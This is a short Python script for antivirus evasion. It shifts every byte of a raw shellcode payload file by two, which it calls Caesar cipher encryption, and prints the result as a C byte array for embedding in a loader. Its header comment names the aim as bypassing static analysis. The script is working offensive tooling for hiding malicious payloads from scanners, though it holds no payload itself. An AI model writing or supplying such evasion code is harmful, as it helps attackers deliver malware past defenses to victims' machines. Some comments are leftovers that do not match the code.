#caesar cipher shellcode encryption to bypass static analysis
import sys

def encrypt(text,s):
    result=''
   
    # traverse text
    for i in range(len(text)):
      #We also do a bitwise AND operation with 0xFF to keep the
      #modified value within the 0-255 range (single byte) in case the increased byte value exceeds 0xFF.
      # Encrypt uppercase characters
        char = text[i]
        result += chr(((char) + s) & 0xFF)
                 
           
    return (result)
  
#check the above function
#shift the payload by two characters 
s = 2

try:
    plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in encrypt(plaintext,s) ) + ' };')